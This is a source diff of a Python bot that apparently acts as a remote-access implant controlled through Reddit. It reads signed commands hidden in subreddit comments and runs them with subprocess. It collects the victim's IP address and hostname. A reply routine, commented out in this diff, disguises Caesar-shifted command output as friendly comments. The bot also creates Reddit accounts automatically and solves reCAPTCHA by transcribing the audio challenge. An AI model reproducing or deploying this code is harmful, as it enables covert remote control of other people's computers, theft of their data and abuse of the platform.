@@ -22,33 +22,33 @@ import hashlib
 import json
 
 # global parameters
-AudioSegment.converter = r'C:\Users\Anna\PycharmProjects\ffmpeg\bin\ffmpeg.exe'
-AudioSegment.ffmpeg = r'C:\Users\Anna\PycharmProjects\ffmpeg\bin\ffmpeg.exe'
+AudioSegment.converter = r'ffmpeg.exe'
+AudioSegment.ffmpeg = r'ffmpeg.exe'
 AudioSegment.ffprobe = r'C:\Users\Anna\PycharmProjects\ffmpeg\bin\ffprobe.exe'
 
 PATH = r'chromedriver.exe'
 
 
-def shift_encrypt(message, shift):
-    encrypted_message = ''
-    for char in message:
-        if char.isalpha():
-            # shift the letter by the specified value
-            encrypted_char = chr((ord(char) - 97 + shift) % 26 + 97)
-        else:
-            # leave non-alphabetic characters unchanged
-            encrypted_char = char
-        encrypted_message += encrypted_char
-    return encrypted_message
-
-
-def writeListToFile(key, list):
-    with open('config.json', 'r') as openfile:
-        dictionary = json.load(openfile)
-    dictionary[key] = list
-    json_object = json.dumps(dictionary, indent=3)
-    with open("config.json", "w") as outfile:
-        outfile.write(json_object)
+# def shift_encrypt(message, shift):
+#     encrypted_message = ''
+#     for char in message:
+#         if char.isalpha():
+#             # shift the letter by the specified value
+#             encrypted_char = chr((ord(char) - 97 + shift) % 26 + 97)
+#         else:
+#             # leave non-alphabetic characters unchanged
+#             encrypted_char = char
+#         encrypted_message += encrypted_char
+#     return encrypted_message
+#
+#
+# def writeListToFile(key, list):
+#     with open('config.json', 'r') as openfile:
+#         dictionary = json.load(openfile)
+#     dictionary[key] = list
+#     json_object = json.dumps(dictionary, indent=3)
+#     with open("config.json", "w") as outfile:
+#         outfile.write(json_object)
 
 
 class Bot:
@@ -72,126 +72,116 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         createFile.write(key)
         createFile.close()
 
-        try:
-            if not os.path.isfile("config.json"):
-                self.signUpToReddit()
-                login = "{},{},{}".format(self.login_email, self.login_username, self.login_password)
-                dictionary = {"login": login, "prev_comments": [], "rpDoneTasks": []}
-                json_object = json.dumps(dictionary, indent=3)
-                with open("config.json", "w") as outfile:
-                    outfile.write(json_object)
+        # try:
+        #     if not os.path.isfile("config.json"):
+        #         self.signUpToReddit()
+        #         login = "{},{},{}".format(self.login_email, self.login_username, self.login_password)
+        #         dictionary = {"login": login, "prev_comments": [], "rpDoneTasks": []}
+        #         json_object = json.dumps(dictionary, indent=3)
+        #         with open("config.json", "w") as outfile:
+        #             outfile.write(json_object)
+        #
+        #     else:
+        #         with open('config.json', 'r') as openfile:
+        #             dictionary = json.load(openfile)
+        #         login_data = dictionary["login"].split(",")
+        #         self.login_email = login_data[0]
+        #         self.login_username = login_data[1]
+        #         self.login_password = login_data[2]
+        #         try:
+        #             self.prev_comments = dictionary["prev_comments"]
+        #             self.rpDoneTasks = dictionary["rpDoneTasks"]
+        #         except Exception as e:
+        #             print(e)
+        # except Exception as e:
+        #     print(e)
 
-            else:
-                with open('config.json', 'r') as openfile:
-                    dictionary = json.load(openfile)
-                login_data = dictionary["login"].split(",")
-                self.login_email = login_data[0]
-                self.login_username = login_data[1]
-                self.login_password = login_data[2]
-                try:
-                    self.prev_comments = dictionary["prev_comments"]
-                    self.rpDoneTasks = dictionary["rpDoneTasks"]
-                except Exception as e:
-                    print(e)
-
-        except Exception as e:
-            print(e)
-
-    def start(self):
-        if os.path.isfile("config.json"):
-            try:
-                data = self.prev_comments[-1][1]
-                if len(data) > 0:
-                    return self.GetNextCommand(data[0], data[1], data[2], data[3])
-
-            except:
-                pass
-
-        return self.GetNextCommand(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])
+    # def start(self):
+    #     print("here")
+    #     if os.path.isfile("config.json"):
+    #         try:
+    #             data = self.prev_comments[-1][1]
+    #             if len(data) > 0:
+    #                 return self.GetNextCommand(data[0], data[1], data[2], data[3])
+    #         except:
+    #             pass
+    #
+    #     return self.GetNextCommand(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])
 
     def getVictimInfo(self):
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         return "{}@{}".format(IPAddr, hostname)
 
-    def writeBack(self, data, err, browser, commentURL):
-        # load the comment URL
-        browser.get(commentURL)
-
-        # get ID of the comment
-        id = commentURL.split("/")[len(commentURL.split("/")) - 2]
-
-        time.sleep(8)
-
-        # reply of the comment
-        WebDriverWait(browser, 20, 1).until(
-            EC.element_to_be_clickable(
-                (By.XPATH, '//*[@id="t1_{}"]/div[2]/div[3]/div[3]/div[2]/button[1]'.format(id)))).click()
-
-        time.sleep(2)
-
-        # insert to data to the reply
-        if len(self.victimInfo) == 0:
-            self.victimInfo = self.getVictimInfo()
-        enc = "{} {} {}".format(data, err, self.victimInfo)
-        enc = shift_encrypt(enc, 16)
-        replyData = """It's so correct!! 
-    send you big like XOXO 
-    {}""".format(enc)
-
-        reply = browser.find_element_by_xpath(
-            '//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[2]/div/div[1]/div/div/div'.format(id))
-        reply.send_keys(replyData)
-
-        time.sleep(2)
-
-        # click on reply of the comment
-        WebDriverWait(browser, 20, 1).until(
-            EC.element_to_be_clickable(
-                (By.XPATH,
-                 '//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[3]/div[1]/button[1]'.format(id)))).click()
-
-        # login to the system
-        loginIframe = browser.find_element_by_css_selector(
-            "#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")
-
-        # switch to the "reCAPTCHA" iframe context
-        browser.switch_to.frame(loginIframe)
-
-        # click on login
-        WebDriverWait(browser, 20, 1).until(
-            EC.element_to_be_clickable(
-                (By.XPATH,
-                 '/html/body/div/main/div[1]/div/div/form/div[4]/a'))).click()
-
-        time.sleep(5)
-
-        # fill the user info for login
-        username = browser.find_element_by_xpath('//*[@id="loginUsername"]')
-        username.send_keys(self.login_username)
-
-        time.sleep(3)
-
-        password = browser.find_element_by_xpath('//*[@id="loginPassword"]')
-        password.send_keys(self.login_password)
-
-        time.sleep(3)
-
-        # click on log in
-        WebDriverWait(browser, 20, 1).until(
-            EC.element_to_be_clickable(
-                (By.XPATH,
-                 '/html/body/div/main/div[1]/div/div/form/fieldset[4]/button'))).click()
-
-        time.sleep(4)
+    # def writeBack(self, data, err, browser, commentURL):
+    #     # load the comment URL
+    #     browser.get(commentURL)
+    #
+    #     # get ID of the comment
+    #     id = commentURL.split("/")[len(commentURL.split("/")) - 2]
+    #
+    #     time.sleep(8)
+    #
+    #     # reply of the comment
+    #     WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="t1_{}"]/div[2]/div[3]/div[3]/div[2]/button[1]'.format(id)))).click()
+    #
+    #     time.sleep(2)
+    #
+    #     # insert to data to the reply
+    #     if len(self.victimInfo) == 0:
+    #         self.victimInfo = self.getVictimInfo()
+    #     enc = "{} {} {}".format(data, err, self.victimInfo)
+    #     enc = shift_encrypt(enc, 16)
+    #     replyData = """It's so correct!!
+    # send you big like XOXO
+    # {}""".format(enc)
+    #
+    #     reply = browser.find_element_by_xpath(
+    #         '//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[2]/div/div[1]/div/div/div'.format(id))
+    #     reply.send_keys(replyData)
+    #
+    #     time.sleep(2)
+    #
+    #     # click on reply of the comment
+    #     WebDriverWait(browser, 20, 1).until(
+    #         EC.element_to_be_clickable(
+    #             (By.XPATH,
+    #              '//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[3]/div[1]/button[1]'.format(id)))).click()
+    #
+    #     # login to the system
+    #     loginIframe = browser.find_element_by_css_selector(
+    #         "#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")
+    #
+    #     # switch to the "reCAPTCHA" iframe context
+    #     browser.switch_to.frame(loginIframe)
+    #
+    #     # click on login
+    #     WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/main/div[1]/div/div/form/div[4]/a'))).click()
+    #
+    #     time.sleep(5)
+    #
+    #     # fill the user info for login
+    #     username = browser.find_element_by_xpath('//*[@id="loginUsername"]')
+    #     username.send_keys(self.login_username)
+    #
+    #     time.sleep(3)
+    #
+    #     password = browser.find_element_by_xpath('//*[@id="loginPassword"]')
+    #     password.send_keys(self.login_password)
+    #
+    #     time.sleep(3)
+    #
+    #     # click on log in
+    #     WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/main/div[1]/div/div/form/fieldset[4]/button'))).click()
+    #
+    #     time.sleep(4)
 
 
     def CommandHandle(self, cmd, parameters, browser=None, dataToSave="", commentURL=""):
         result = hashlib.md5(dataToSave.encode('utf_8')).hexdigest()
-        print(result, self.rpDoneTasks, type(self.rpDoneTasks))
         if cmd == "pm" and result not in self.rpDoneTasks:
             self.rpDoneTasks.insert(0, result)
-            writeListToFile("rpDoneTasks", self.rpDoneTasks)
+            # writeListToFile("rpDoneTasks", self.rpDoneTasks)
             root = tk.Tk()
             root.title("Message from Reddit-Bot")
             root.geometry("400x200")
@@ -205,9 +195,9 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         if cmd == "rp" and result not in self.rpDoneTasks:  # rp
             res = subprocess.Popen(parameters, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             data, err = res.communicate()
-            self.writeBack(data, err, browser, commentURL)
+            # self.writeBack(data, err, browser, commentURL)
             self.rpDoneTasks.insert(0, result)
-            writeListToFile("rpDoneTasks", self.rpDoneTasks)
+            # writeListToFile("rpDoneTasks", self.rpDoneTasks)
 
     def GetNextCommand(self, sub_reddit, key1, key2, key3):
         # set parameters for web driver
@@ -225,7 +215,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         time.sleep(2)
 
         # find the search bar on the page
-        search_bar = browser.find_element_by_css_selector("#header-search-bar")
+        search_bar = browser.find_element(By.CSS_SELECTOR, "#header-search-bar")
 
         # insert and select the given subreddit name and keys in the search bar
         search_bar.send_keys("r/{}".format(sub_reddit))
@@ -242,7 +232,8 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         time.sleep(4)
 
         # find all comments
-        comments = browser.find_elements_by_xpath("//div[contains(@class, 'Comment')]")
+        comments = WebDriverWait(browser, 10).until(EC.presence_of_all_elements_located((By.XPATH, "//div[contains(@class, 'Comment')]")))
+        # comments = browser.find_elements_by_xpath("//div[contains(@class, 'Comment')]")
 
         # if no relevant comments found [path corrupted], update status and exit
         if len(comments) == 0:
@@ -255,14 +246,15 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         # check signature, if correct do command, save comment id, and get next keys, if incorrect check next comment
         for comment in comments:
             # extract message and signature from comment
-            full_msg = comment.find_element_by_xpath("./div[3]/div[2]/div").text
+            full_msg = comment.find_element(By.XPATH, "./div[3]/div[2]/div").text
+            # full_msg = comment.find_element_by_xpath("./div[3]/div[2]/div").text
             lines = full_msg.split("\n")[:-1]
             msg_str = '\n'.join(lines)
             msg = bytes(msg_str, "utf-8")
 
             # load public key from file
             with open('public_key.pem', 'rb') as f:
-                pem_data = f.read()
+                pem_data = f.read().decode('utf-8')
                 vk = ecdsa.VerifyingKey.from_pem(pem_data)
 
             # verify signature
@@ -271,15 +263,14 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
                 vk.verify(signature, msg)
 
                 # save link to comment in
-                a_element = browser.find_element_by_xpath(
-                    '/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[1]/div/div/div/div/div[2]/div/div[2]/div/div[3]/div[1]/span/a')
+                a_element = browser.find_element(By.XPATH, '/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div/div/div[2]/div[1]/div[2]/div/div/div[1]/div/div/div/div/div[2]/div/div[2]/div/div[3]/div[1]/span/a')
                 href = a_element.get_attribute('href')
                 comment_url = href.split('?')[0]
                 self.prev_comments.append((comment_url, [sub_reddit, key1, key2, key3]))
-                try:
-                    writeListToFile("prev_comments", self.prev_comments)
-                except Exception as e:
-                    print(e)
+                # try:
+                #     writeListToFile("prev_comments", self.prev_comments)
+                # except Exception as e:
+                #     print(e)
 
                 # execute the command if it exists
                 start_index = msg_str.find("😍")
@@ -337,8 +328,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         parameters.headless = False
 
         # create an instance of a web driver that corresponds to Chrome
-        browser = webdriver.Chrome(options=parameters,
-                                   executable_path=PATH)
+        browser = webdriver.Chrome(options=parameters,executable_path=PATH)
         browser.maximize_window()
         tempCommentsList = copy.deepcopy(self.prev_comments)
         for prev_comment in reversed(self.prev_comments):
@@ -347,15 +337,14 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
             time.sleep(2)
 
             # extract message and signature from comment
-            full_msg = browser.find_element_by_xpath(
-                "/html/body/div[1]/div/div[2]/div[2]/div/div/div/div[2]/div[3]/div[1]/div[2]/div[5]/div/div/div/div[1]/div/div/div/div[2]/div[3]/div[2]/div").text
+            full_msg = browser.find_element(By.CSS_SELECTOR, "#-post-rtjson-content").text
             lines = full_msg.split("\n")[:-1]
             msg_str = '\n'.join(lines)
             msg = bytes(msg_str, "utf-8")
 
             # load public key from file
             with open('public_key.pem', 'rb') as f:
-                pem_data = f.read()
+                pem_data = f.read().decode('utf-8')
                 vk = ecdsa.VerifyingKey.from_pem(pem_data)
 
             # verify signature
@@ -387,33 +376,32 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         # if all prev comments corrupted, use the bootstrap
         browser.quit()
         self.prev_comments = tempCommentsList
-        status, next_keys = self.GetNextCommand(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2],
-                                                self.bootstrap[3])
+        status, next_keys = self.GetNextCommand(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])
         return status, next_keys
 
-    def transcribe(self, url):
-        voiceFileNameMp3 = "voiceFromReddit.mp3"
-        voiceFileNameWav = "voiceFromReddit.wav"
-
-        # download the audio capture form reddit
-        with open(voiceFileNameMp3, "wb") as f:
-            r = requests.get(url, allow_redirects=True)
-            f.write(r.content)
-            f.close()
-
-        time.sleep(5)
-
-        # convert to wav
-        AudioSegment.from_mp3(voiceFileNameMp3).export(voiceFileNameWav, format="wav")
-
-        r = sr.Recognizer()
-        text = ""
-        with sr.AudioFile(voiceFileNameWav) as source:
-            # listen for the data (load audio to memory)
-            audio_data = r.listen(source)
-            # recognize (convert from speech to text)
-            text = r.recognize_google(audio_data)
-        return text
+    # def transcribe(self, url):
+    #     voiceFileNameMp3 = "voiceFromReddit.mp3"
+    #     voiceFileNameWav = "voiceFromReddit.wav"
+    #
+    #     # download the audio capture form reddit
+    #     with open(voiceFileNameMp3, "wb") as f:
+    #         r = requests.get(url, allow_redirects=True)
+    #         f.write(r.content)
+    #         f.close()
+    #
+    #     time.sleep(5)
+    #
+    #     # convert to wav
+    #     AudioSegment.from_mp3(voiceFileNameMp3).export(voiceFileNameWav, format="wav")
+    #
+    #     r = sr.Recognizer()
+    #     text = ""
+    #     with sr.AudioFile(voiceFileNameWav) as source:
+    #         # listen for the data (load audio to memory)
+    #         audio_data = r.listen(source)
+    #         # recognize (convert from speech to text)
+    #         text = r.recognize_google(audio_data)
+    #     return text
 
     def signUpToReddit(self):
         # set parameters for web driver
@@ -421,24 +409,22 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         parameters.headless = False  # display a user interface
 
         # create an instance of a web driver that corresponds to Chrome
-        driver = uc.Chrome(options=parameters,
-                           executable_path=PATH)
+        driver = uc.Chrome(options=parameters,executable_path=PATH)
         driver.maximize_window()
 
         # load the web page corresponding to the given url
         driver.get(self.url)
 
         # click on the "Join Reddit" button
-        WebDriverWait(driver, 10, 1).until(EC.element_to_be_clickable(
-            (By.XPATH, "/html/body/div[1]/div/div[2]/div[2]/div/div[1]/div[2]/button"))).click()
+        WebDriverWait(driver, 10, 1).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div[1]/div/div[2]/div[2]/div/div[1]/div[2]/button"))).click()
 
-        iframe = driver.find_element_by_css_selector("iframe._25r3t_lrPF3M6zD2YkWvZU")
+        iframe = driver.find_element(By.CSS_SELECTOR,"iframe._25r3t_lrPF3M6zD2YkWvZU")
 
         # switch to the "Join Reddit" iframe context
         driver.switch_to.frame(iframe)
 
         # insert random email into email field
-        email_field = driver.find_element_by_css_selector("#regEmail")
+        email_field = driver.find_element(By.CSS_SELECTOR,"#regEmail")
         char = string.ascii_lowercase + string.digits
         random_str = "".join(random.choices(char, k=7))
         self.login_email = "{}@gmail.com".format(random_str)
@@ -446,18 +432,16 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         time.sleep(2)
 
         # click "Continue"
-        WebDriverWait(driver, 10, 1).until(
-            EC.element_to_be_clickable(
-                (By.XPATH, "/html/body/div/main/div[1]/div/div/form/fieldset[2]/button"))).click()
+        WebDriverWait(driver, 10, 1).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div/main/div[1]/div/div/form/fieldset[2]/button"))).click()
 
         time.sleep(4)
-        userName = driver.find_element_by_css_selector("#regUsername")
+        userName = driver.find_element(By.CSS_SELECTOR,"#regUsername")
         self.login_username = userName.get_attribute('value')
 
         time.sleep(3)
 
         # insert password
-        pass_field = driver.find_element_by_css_selector("#regPassword")
+        pass_field = driver.find_element(By.CSS_SELECTOR,"#regPassword")
         char = string.ascii_lowercase + string.digits + string.ascii_uppercase
         random_str = "".join(random.choices(char, k=14))
         self.login_password = "{}".format(random_str)
@@ -467,36 +451,30 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         pass_field.send_keys(Keys.ENTER)
         time.sleep(3)
 
-        iframeReCAPTCHA = driver.find_element_by_css_selector("#g-recaptcha > div > div > iframe")
+        iframeReCAPTCHA = driver.find_element(By.CSS_SELECTOR,"#g-recaptcha > div > div > iframe")
 
         # switch to the "reCAPTCHA" iframe context
         driver.switch_to.frame(iframeReCAPTCHA)
 
         # click on reCAPTCHA button
-        WebDriverWait(driver, 10, 1).until(
-            EC.element_to_be_clickable(
-                (By.XPATH, '//*[@id="recaptcha-anchor"]/div[1]'))).click()
+        WebDriverWait(driver, 10, 1).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="recaptcha-anchor"]/div[1]'))).click()
 
         time.sleep(3)
 
         driver.switch_to.default_content()
 
-        iframeReCAPTCHA = driver.find_element_by_css_selector(
-            "#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")
+        iframeReCAPTCHA = driver.find_element(By.CSS_SELECTOR,"#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")
 
         # switch to the "reCAPTCHA" iframe context
         driver.switch_to.frame(iframeReCAPTCHA)
 
-        iframeReCAPTCHA2 = driver.find_element_by_css_selector(
-            "body > div:nth-child(10) > div:nth-child(2) > iframe")
+        iframeReCAPTCHA2 = driver.find_element(By.CSS_SELECTOR,"body > div:nth-child(10) > div:nth-child(2) > iframe")
 
         # switch to the "reCAPTCHA" iframe context
         driver.switch_to.frame(iframeReCAPTCHA2)
 
         # choose audio
-        WebDriverWait(driver, 10, 1).until(
-            EC.element_to_be_clickable(
-                (By.XPATH, '//*[@id="recaptcha-audio-button"]'))).click()
+        WebDriverWait(driver, 10, 1).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="recaptcha-audio-button"]'))).click()
 
         time.sleep(3)
 
@@ -504,31 +482,25 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         text = self.transcribe(driver.find_element(By.XPATH, '//*[@id="rc-audio"]/div[7]/a').get_attribute('href'))
 
         # insert the converted text to input
-        voice = driver.find_element_by_css_selector("#audio-response")
+        voice = driver.find_element(By.CSS_SELECTOR,"#audio-response")
         voice.send_keys(text)
 
         time.sleep(3)
 
         # click the verify button
-        WebDriverWait(driver, 10, 1).until(
-            EC.element_to_be_clickable(
-                (By.XPATH, '//*[@id="recaptcha-verify-button"]'))).click()
+        WebDriverWait(driver, 10, 1).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="recaptcha-verify-button"]'))).click()
 
         time.sleep(3)
 
         # back to previous iframe
         driver.switch_to.default_content()
 
-        iframeReCAPTCHA = driver.find_element_by_css_selector(
-            "#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")
+        iframeReCAPTCHA = driver.find_element(By.CSS_SELECTOR,"#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")
 
         # switch to the "reCAPTCHA" iframe context
         driver.switch_to.frame(iframeReCAPTCHA)
 
-        WebDriverWait(driver, 20, 1).until(
-            EC.element_to_be_clickable(
-                (By.XPATH, '/html/body/div[1]/main/div[2]/div/div/fieldset/button'))).click()
+        WebDriverWait(driver, 20, 1).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/main/div[2]/div/div/fieldset/button'))).click()
 
         time.sleep(3)
-
         driver.quit()
